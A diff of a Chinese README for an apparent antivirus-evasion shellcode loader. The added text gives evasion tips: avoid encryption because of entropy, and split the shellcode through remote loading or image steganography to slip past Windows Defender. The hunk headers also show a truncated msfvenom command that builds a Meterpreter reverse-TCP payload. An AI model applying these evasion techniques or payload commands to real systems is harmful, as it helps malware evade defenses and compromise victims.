@@ -30,8 +30,8 @@
 
 * 视频讲解：https://www.bilibili.com/video/BV1RK411z7XA/  欢迎点赞关注
 
-- 刚开始可以免杀主流杀软的，不过后面肯定会被乱杀，主要目的是学习恶意代码和自动化
-
+- 刚开始可以免杀主流杀软的，不过后面肯定会被乱杀，开源的目的是学习恶意代码和自动化脚本
+- 本人并不推荐shellcode加密，一般的加密算法都会使程序熵增，可以使用远程加载和图片隐写的方式分离shellcode
 
 # 2.功能
 
@@ -51,7 +51,7 @@
 
 您必须下载并安装以下环境：
 
-1.Mingw64(C/C++)的编程环境：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z
+1.Mingw64(C/C++)：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z
 
 解压完以后，将bin目录添加至环境变 量即可
 
@@ -78,7 +78,11 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 ## 0x03.Automation_loader
 
+必须保证你的shellcode是干净的，否则还是会被Windows Defender抓住
 
+
+
+![](Image\demo.gif)
 
 # 4.更新
 
@@ -95,4 +99,4 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 # 6.致谢
 
-刚开始学习了他的编码方式，这非常有意义：https://github.com/icyguider/Shhhloader
+https://github.com/icyguider/Shhhloader
